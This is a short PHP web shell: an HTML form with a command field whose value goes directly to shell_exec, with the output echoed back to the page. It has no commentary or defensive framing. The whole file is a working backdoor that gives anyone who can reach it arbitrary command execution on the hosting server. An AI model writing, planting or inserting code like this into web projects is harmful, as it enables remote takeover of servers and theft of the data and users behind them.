<html>
<form name="cmd" action="" method="post">
$ <input type="text" name="cmd">
<input type="submit" value="submit" name="submit">
</form>
<?php
if (isset($_POST['submit'])){
$target = $_REQUEST[ 'cmd' ];
echo shell_exec($target);
}
?>
</html>